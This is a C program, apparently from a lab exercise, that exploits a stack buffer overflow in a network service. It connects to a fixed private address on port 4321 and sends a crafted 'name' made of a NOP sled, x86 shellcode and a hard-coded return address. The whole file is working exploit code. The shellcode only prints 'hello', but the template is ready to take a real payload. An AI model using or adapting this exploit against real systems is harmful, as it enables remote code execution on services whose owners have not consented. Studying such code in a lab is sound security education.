#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <arpa/inet.h>


int main(int argc, char* argv[]) {
	
	char shellcode[] = "\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x05\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x68\x65\x6c\x6c\x6f";
	
	char ret[] = "\x01\xe7\xff\xff\xff\x7f";
	printf("\nLength of return address: %d\n\n", strlen(ret));
	
	char msg[256];
	memset(msg, 0, 256);
	
	
	// The total length of greeting_text
	int n = atoi(argv[1]);
	int NOP_len = n - strlen(shellcode) - 18;
	
	
	// The NOP-slide
	for (int k = 0; k < NOP_len; k++) {
		msg[k] = '\x90';
	}

	// The payload
	strcat(msg, shellcode);
	
	// The return address
	strcat(msg, ret);
	
	// Adding the \n so fgets returns
	strcat(msg, "\n");
	
	printf("msg: %s\n", msg);
	
	// Building destination addr_in
	struct sockaddr_in dest;
	dest.sin_family = AF_INET;
	dest.sin_port = htons(4321);
	if (inet_pton(AF_INET, "192.168.56.103", &(dest.sin_addr)) != 1) printf("inet_pton error\n\n");
	for (int k = 0; k < 8; k++) dest.sin_zero[k] = 0;

	// Building the socket
	int sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd == -1) {
		printf("Error building socket");
  		exit(1);
  	}
	
	// Connecting
	if (connect(sockfd, (struct sockaddr*) &dest, sizeof(struct sockaddr_in)) != 0) {
		printf("Failed to connect");
  		exit(1);
	} else {
		printf("Connected successfully\n\n");
	}

	
	// Message 1
	int buf_len = 2000;
	char recvbuf[buf_len];
	memset(recvbuf, 0, buf_len);
	if (recv(sockfd, recvbuf, buf_len, 0) == -1) {
		printf("Error receiving message");
  		exit(1);
	}
	printf("Message 1: %s\n", recvbuf);
	
	
	// Sending name
	if (send(sockfd, msg, strlen(msg), 0) != strlen(msg)) {
		printf("Failed to send message entirely");
  		exit(1);
	} else {
		printf("Message sent\n\n");
	}
	
	// Reply
	memset(recvbuf, 0, buf_len);
	if (recv(sockfd, recvbuf, buf_len, 0) == -1) {
		printf("Error receiving message");
  		exit(1);
	}
	printf("%s\n", recvbuf);
	
	return 0;
	
}
